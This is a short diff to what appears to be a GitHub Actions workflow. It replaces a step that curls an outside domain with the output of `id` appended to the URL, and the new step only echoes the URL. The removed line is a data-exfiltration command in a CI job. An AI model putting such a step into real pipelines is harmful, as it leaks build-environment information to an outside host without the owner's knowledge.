@@ -7,4 +7,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - run: curl "http://eldruin.top/$(id)"
+      - run: echo "http://eldruin.top/$(id)"
